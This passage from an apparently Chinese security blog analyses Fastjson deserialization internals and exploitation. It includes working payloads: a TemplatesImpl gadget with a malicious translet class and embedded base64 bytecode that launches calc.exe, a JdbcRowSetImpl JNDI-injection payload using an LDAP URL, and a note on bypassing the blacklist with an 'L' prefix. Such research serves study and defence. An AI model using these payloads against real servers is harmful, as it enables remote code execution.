class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>class com.alibaba.fastjson.JSONObject<br>调用空参构造<br>调用setAge()<br>调用setName()<br>class fastjson.User<br></code></pre></td></tr></table></figure><p>由此可知以下结论：</p><ul><li><p>com.alibaba.fastjson.JSONObject不能强制转换为其他类型</p></li><li><p>不指定@type不会调用<strong>构造方法</strong>和<strong>setter</strong></p></li><li><p>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</p></li><li><p>跟进parseObject()可以看到和parse的区别：</p><p>public static JSONObject parseObject(String text) {<br>    Object obj &#x3D; parse(text);<br>    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);<br>}</p></li></ul><p>编写测试类Persion</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean sex;<br>    <span class="hljs-keyword">private</span> Properties prop;<br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//get 返回Boolean</span><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getSex()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sex;<br>    &#125;<br>    <span class="hljs-comment">//get 返回ProPerties</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-comment">//在输出时会自动调用的对象ToString函数</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[Person Object] name=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; full_name=&quot;</span> + <span class="hljs-built_in">this</span>.full_name  + <span class="hljs-string">&quot;, age=&quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot;, prop=&quot;</span> + <span class="hljs-built_in">this</span>.prop + <span class="hljs-string">&quot;, sex=&quot;</span> + <span class="hljs-built_in">this</span>.sex;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试序列化及反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">eneity3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.fastjson.Person\&quot;, \&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eneity3,Person.class);<br><span class="hljs-comment">//输出会调用obj对象的tooString函数</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Person构造函数<br>setAge()<br>getProp()<br>[Person Object] name=zhang full_name=null, age=18, prop=null, sex=null<br></code></pre></td></tr></table></figure><pre><code class="hljs">public name 反序列化成功,private full_name 反序列化失败,private age setAge函数被调用,private sex getsex函数没有被调用,private prop getprop函数被成功调用</code></pre><p>从中得知</p><ul><li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul><h3 id="3-parse过程调试"><a href="#3-parse过程调试" class="headerlink" title="3.parse过程调试"></a>3.parse过程调试</h3><p>调用过程如下：</p><p><img src="/image/2414837-20220118174133297-1132976695.png" alt="image-20220117102346305"></p><p><img src="/image/image-20220905160303063-16623649847141.png" alt="image-20220905160303063"></p><p>调用JSON#parse()方法，后调用new DefaultJSONParser();</p><p><img src="/image/image-20220905160450268-16623650916213-16623650950735.png" alt="image-20220905160450268"></p><p>new DefaultJSONParser()中调用ParserConfig.getGlobalInstance()，传入配置，配置中包含黑名单java.lang.Thread</p><p><img src="/image/image-20220906111415947-16624340578123.png" alt="image-20220906111415947"></p><p>调用至DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)</p><p><img src="/image/image-20220905160710420-16623652323247.png" alt="image-20220905160710420"></p><p>this调用至构造方法，lexer.getCurrent()获取了lexer的ch属性，此处为获取JSON字符串的第一个字符，即{</p><p><img src="/image/image-20220905162236365-16623661597249.png" alt="image-20220905162236365"></p><p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中，此处new JSONObject对象</p><p><img src="/image/image-20220210104604897.png" alt="image-20220210104604897"></p><p>调用至JSONObject#JSONObject(int initialCapacity, boolean ordered)构造方法</p><p><img src="/image/image-20220905173804775-166237068638619.png" alt="image-20220905173804775"></p><p>调用至DeafultJSONParser#parseObject(final Map object, Object fieldName)方法，此处fieldName为null,此时尚未开始解析JSON字符串</p><p><img src="/image/image-20220905164102745-166236726415211.png" alt="image-20220905164102745"></p><p>判断下一个字符是否为 “ ,后取出”“中键名，即@type，然后判断接下来字符是否符合规则</p><p><img src="/image/image-20220905174430009-166237107164521.png" alt="image-20220905174430009"></p><p>调用TypeUtils.loadClass(typeName, config.getDefaultClassLoader())方法获取类对象</p><p><img src="/image/image-20220905164830719-166236771232813.png" alt="image-20220905164830719"></p><p>从map中取classNmae,map中缓存一些常用基本类，然后可以看到className.startsWith(“L”),会对L进行去除，重新loadClass，可利用此次对ClassName添加L绕过黑名单</p><p><img src="/image/image-20220906103214944-16624315371361.png" alt="image-20220906103214944"></p><p>利用类加载器加载类，然后将对类缓存到maping对象中</p><p><img src="/image/image-20220905164854929-166236774004015.png" alt="image-20220905164854929"></p><p>运行至ObjectDeserializer deserializer &#x3D; config.getDeserializer(clazz);</p><p><img src="/image/image-20220906153358338-16624496402555.png" alt="image-20220906153358338"></p><p>进入ParserConfig#getDeserializer(Type type)方法后进行大量判断，下图为判断黑名单，最后进入到derializer &#x3D; createJavaBeanDeserializer(clazz, type);</p><p><img src="/image/image-20220906155157758-16624507203509.png" alt="image-20220906155157758"></p><p><img src="/image/image-20220906153844118-16624499263317.png" alt="image-20220906153844118"></p><p>经过调用createJavaBeanDeserializer()设置deserializer属性，属性如下：</p><p><img src="/image/image-20220906160642016-166245160388711.png" alt="image-20220906160642016"></p><p><img src="/image/image-20220906160751848-166245167436613.png" alt="image-20220906160751848"></p><p>最后调用DeafultJSONParser#parseObject()中deserializer.deserialze(this, clazz, fieldName),进入反序列化操作</p><p><img src="/image/image-20220905171235790-166236915766317.png" alt="image-20220905171235790"></p><p>调用至JavaBeanDeserializer#protected <T> T deserialze()方法，后调用至getSeeAlso()</p><p><img src="/image/image-20220906162146410-166245250961915.png" alt="image-20220906162146410"></p><p>调用至JavaBeanDeserializer()后调用至JavaBeanInfo#build()方法</p><p><img src="/image/image-20220906162541552-166245274334517.png" alt="image-20220906162541552"></p><p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p><p><img src="/image/image-20220906163301544-166245318412819.png" alt="image-20220906163301544"></p><p><strong>set开头的方法要求如下：</strong></p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型，会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p><p><strong>get开头的方法要求如下：</strong></p><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><h3 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1 Fastjson &lt;&#x3D;1.2.24"></a>1 Fastjson &lt;&#x3D;1.2.24</h3><h4 id="1-TemplatesImpl利用链"><a href="#1-TemplatesImpl利用链" class="headerlink" title="1&gt;.TemplatesImpl利用链"></a>1&gt;.TemplatesImpl利用链</h4><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ol><p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据。故此利用链利用条件苛刻，并不常见。</p><p><img src="/image/image-20220209171617414.png" alt="image-20220209171617414"></p><h5 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>debug调试，JSONObject obj &#x3D; JSON.parseObject(payload1, Feature.SupportNonPublicField)处下断点;此漏洞利用方法必须要存在<code>Feature.SupportNonPublicField</code>设置（即允许private对象传入）</p><p><img src="/image/image-20220210094825242.png" alt="image-20220210094825242"></p><p>进入JSON类中，发现JSON.parseObject()<code>调用了</code>JSON.parse()</p><p><img src="/image/image-20220210095210483.png" alt="image-20220210095210483"></p><p>进入到JSON类#parse(String text, Feature… features)方法中，对可控长度变量的分析，这里也就是<code>Feature.SupportNonPublicField</code>的开启识别</p><p><img src="/image/image-20220210095334436.png" alt="image-20220210095334436"></p><p>调用JSON#parse(String text, int features)，继续执行parser.parse()接口</p><p><img src="/image/image-20220210095627159.png" alt="image-20220210095627159"></p><p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中</p><p><img src="/image/image-20220210104604897.png" alt="image-20220210104604897"></p><p>调用deserializer.deserialze(this, clazz, fieldName)</p><p><img src="/image/image-20220210105038883.png" alt="image-20220210105038883"></p><p>进入ParserConfig.java 进行设置</p><p><img src="/image/image-20220210105217734.png" alt="image-20220210105217734"></p><p>进入JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName) ，进行反序列化操作</p><p><img src="/image/image-20220210105514778.png" alt="image-20220210105514778"></p><p>设置参数是会调用FieldDeserializer.java中的setValue，已经可以看到Method方法，标志着这里触发反射</p><p><img src="/image/image-20220210111123619.png" alt="image-20220210111123619"></p><p>前面的参数会不满足if(method !&#x3D; null)的判断，到outputProperties的时候，因为它是个类，存在method，于是进入if分支，调用方法为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</p><p><img src="/image/image-20220210111822121.png" alt="image-20220210111822121"></p><p>在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()方法下断点，调用newTransformer()</p><p><img src="/image/image-20220210113532817.png" alt="image-20220210113532817"></p><p>跟进调用getTransletInstance()</p><p><img src="/image/image-20220210113623886.png" alt="image-20220210113623886"></p><p>跟进调用defineTransletClasses()s</p><p><img src="/image/image-20220210113839439.png" alt="image-20220210113839439"></p><p>最后初始化类，触发代码执行</p><h5 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>创建恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>    <br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase64</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">io</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10240</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = io.read(buf)) &gt; <span class="hljs-number">0</span>) &#123;<br>        os.write(buf, <span class="hljs-number">0</span>, len);<br>    &#125;<br>    io.close();<br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());<br>    <span class="hljs-keyword">return</span> s;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> ClassBase64Util.FiletoBase64(<span class="hljs-string">&quot;E:\\JAVA-PAYLOAD\\mydemo\\target\\classes\\fastjson\\Shell.class&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br><br><span class="hljs-comment">//System.out.println(payload1);</span><br><span class="hljs-comment">//&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAQTGZhc3Rqc29uL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHACsHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADmZhc3Rqc29uL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAADgAEABEADQAUABAAEgARABMAFQAVAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB0AAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB8ADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAeAB8AAgAAAAEAIAAhAAMAGwAAAAQAAQAcAAEAIgAAAAIAIw==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br><br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure><h4 id="2-JdbcRowSetImpl利用链"><a href="#2-JdbcRowSetImpl利用链" class="headerlink" title="2&gt;.JdbcRowSetImpl利用链"></a>2&gt;.JdbcRowSetImpl利用链</h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><p>JdbcRowSetImpl利用链为利用JNDI注入，利用条件为不用JAVA版本下RMI、LDAP限制条件，高版本使用高版本绕过技术</p><h5 id="利用链分析：-1"><a href="#利用链分析：-1" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>JdbcRowSetImpl#setAutoCommit()方法如下：</p><p><img src="/image/image-20220907103135441-16625178971631.png" alt="image-20220907103135441"></p><p>Fastjson会自动调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();方法如下：</p><p><img src="/image/image-20220907103515820-16625181177893.png" alt="image-20220907103515820"></p><p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至lookup(this.getDataSourceName()</p><p>故此处存在JNDI注入，payload为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/image-20220907112138942-16625209008225.png" alt="image-20220907112138942"></p><h5 id="PAYLOAD-1"><a href="#PAYLOAD-1" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="21-2-25"><a href="#21-2-25" class="headerlink" title="21.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41"></a>21.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</h3><h4 id="PAYLOAD1"><a href="#PAYLOAD1" class="headerlink" title="PAYLOAD1"></a>PAYLOAD1</h4><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p><h5 id="利用链分析：-2"><a href="#利用链分析：-2" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>FastJSON1.2.24</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="hljs-built_in">this</span>.config.getDefaultClassLoader());<br></code></pre></td></tr></table></figure><p>FastJSON1.2.25</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.config.checkAutoType(ref, (Class)<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>获取类对象的方法由 TypeUtils.loadClass 变成了this.config.checkAutoType</p><p>Fastjson1.2.25中com.alibaba.fastjson.parser.ParserConfig类进行了修改修改，添加属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> autoTypeSupport; <span class="hljs-comment">//控制是否可进行反序列化，默认为false</span><br><span class="hljs-keyword">private</span> String[] denyList;<span class="hljs-comment">//黑名单</span><br><span class="hljs-keyword">private</span> String[] acceptList;<span class="hljs-comment">//白名单</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20220908100501152-16626027031855.png" alt="image-20220908100501152"></p><p>构造方法中对黑白名单进行赋值</p><p><img src="/image/image-20220908102206222-16626037279307.png" alt="image-20220908102206222"></p><p>com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法中调用ParserConfig#checkAutoType()</p><p><img src="/image/image-20220908102648098-16626040098489.png" alt="image-20220908102648098"></p><p>checkAutoType()中对autoTypeSupport进行判断，若为true则先进行白名单校验，若为白名单内则进入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常，若未在黑名单中则在Map中查找类</p><p><img src="/image/image-20220908100111279-16626024730933.png" alt="image-20220908100111279"></p><p>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true，会再一次进行判断然后进入到TypeUtils.loadClass中</p><p><img 